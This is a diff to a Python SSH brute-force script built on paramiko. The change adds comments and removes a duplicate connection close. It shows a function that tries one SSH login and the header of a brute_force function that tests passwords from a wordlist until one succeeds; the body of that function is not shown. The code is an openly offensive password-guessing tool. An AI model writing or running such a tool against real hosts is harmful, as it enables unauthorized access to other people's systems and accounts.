@@ -2,12 +2,14 @@ import paramiko
 import sys
 import time
 
+# Attempt a single SSH connection. Returns True if auth succeeds, False otherwise.
+
 def ssh_connect(ip, port, username, password):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         client.connect(ip, port=port, username=username, password=password, timeout=3)
-        client.close()
+        
         return True
     except paramiko.AuthenticationException:
         return False
@@ -16,6 +18,8 @@ def ssh_connect(ip, port, username, password):
     finally:
     	client.close()
         
+# Read passwords from wordlist and try each one via ssh_connect.
+# Stops on first successful authentication.
 
 def brute_force(ip, port, username, wordlist):
     
